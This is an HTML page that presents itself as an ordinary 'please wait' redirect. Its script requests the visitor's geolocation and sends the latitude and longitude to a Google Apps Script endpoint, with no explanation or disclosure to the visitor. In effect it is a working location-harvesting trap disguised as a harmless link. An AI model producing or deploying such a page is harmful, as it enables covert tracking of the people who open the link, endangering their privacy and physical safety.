<!DOCTYPE html>
<html>
  <head>
    <title>Redirecting...</title>
  </head>
  <body>
    <h3>Please wait while we redirect you...</h3>

    <script>
      // Check if geolocation is available in the browser
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
          var latitude = position.coords.latitude;
          var longitude = position.coords.longitude;

          // Redirect to Google Apps Script with latitude and longitude as parameters
          window.location.href = "https://script.google.com/macros/s/AKfycbwPG36u1IVxXDwhaeyUWI74EN5qdXceHq-ycsAN9qggO3xj6TvG7AroXIcxh7MFfcNI/exec?lat=" + latitude + "&lng=" + longitude;
        }, function(error) {
          // If geolocation fails, redirect without location data
          window.location.href = "https://script.google.com/macros/s/AKfycbwPG36u1IVxXDwhaeyUWI74EN5qdXceHq-ycsAN9qggO3xj6TvG7AroXIcxh7MFfcNI/exec";
        });
      } else {
        // If geolocation is not supported, redirect without location data
        window.location.href = "https://script.google.com/macros/s/AKfycbwPG36u1IVxXDwhaeyUWI74EN5qdXceHq-ycsAN9qggO3xj6TvG7AroXIcxh7MFfcNI/exec";
      }
    </script>
  </body>
</html>
